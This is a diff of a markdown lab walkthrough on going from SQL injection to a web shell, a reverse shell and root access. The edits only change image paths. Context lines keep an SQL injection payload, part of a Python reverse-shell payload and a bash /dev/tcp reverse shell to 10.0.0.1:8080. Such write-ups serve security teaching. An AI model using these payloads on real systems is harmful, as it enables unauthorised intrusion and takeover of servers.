@@ -12,7 +12,7 @@ Right when I launched the lab, this search field caught my attention. Using a si
 ' OR 1=1; -- -
 ```
 
-![image.png](images/sql-injection-to-reverse-shell-and-root-access/init.png)
+![image.png](/images/sql-injection-to-reverse-shell-and-root-access/init.png)
 
 This behavior clearly pointed to a classic SQLi vulnerability, and hinted that a `UNION SELECT` injection could work.
 
@@ -105,7 +105,7 @@ Among the responses, I found `/admin`:
 
 Accessing `http://172.16.11.54/admin`, I got the login page.
 
-![image.png](images/sql-injection-to-reverse-shell-and-root-access/login-page.png)
+![image.png](/images/sql-injection-to-reverse-shell-and-root-access/login-page.png)
 
 ### Creating a web shell
 
@@ -134,7 +134,7 @@ Looking back at the `wfuzz` output, I noticed some other directories:
 
 Almost giving up, I tried writing the shell inside `/includes` — and it worked!
 
-![image.png](images/sql-injection-to-reverse-shell-and-root-access/web-shell.png)
+![image.png](/images/sql-injection-to-reverse-shell-and-root-access/web-shell.png)
 
 ### Getting a reverse shell
 
@@ -142,7 +142,7 @@ Now with the web shell in place, I aimed for a reverse shell.
 
 First step: check what languages the server supports. Since it was a Linux server, Python seemed like a good candidate.
 
-![image.png](images/sql-injection-to-reverse-shell-and-root-access/python-binary.png)
+![image.png](/images/sql-injection-to-reverse-shell-and-root-access/python-binary.png)
 
 Found Python. Time to craft the payload:
 
@@ -158,7 +158,7 @@ subprocess.call(["/bin/bash","-i"]);'
 
 Triggered the payload via the web shell… and got a reverse shell:
 
-![image.png](images/sql-injection-to-reverse-shell-and-root-access/reverse-shell.png)
+![image.png](/images/sql-injection-to-reverse-shell-and-root-access/reverse-shell.png)
 
 … Then I stabilized it:
 
@@ -176,7 +176,7 @@ export TERM=xterm
 
 With shell access, I started enumerating files and permissions:
 
-![image.png](images/sql-injection-to-reverse-shell-and-root-access/file-permissions.png)
+![image.png](/images/sql-injection-to-reverse-shell-and-root-access/file-permissions.png)
 
 No write permissions, but I could **read everything**. Time to look for hidden config files:
 
@@ -232,7 +232,7 @@ INSERT INTO tbladmin VALUES(0,
 
 Logged into the panel… and it worked!
 
-![image.png](images/sql-injection-to-reverse-shell-and-root-access/admin-panel.png)
+![image.png](/images/sql-injection-to-reverse-shell-and-root-access/admin-panel.png)
 
 ### Privilege Escalation with LinPEAS
 
@@ -262,7 +262,7 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 
 … And got my shell… as **root**!
 
-![image.png](images/sql-injection-to-reverse-shell-and-root-access/privesec.png)
+![image.png](/images/sql-injection-to-reverse-shell-and-root-access/privesec.png)
 
 ### TL;DR
 
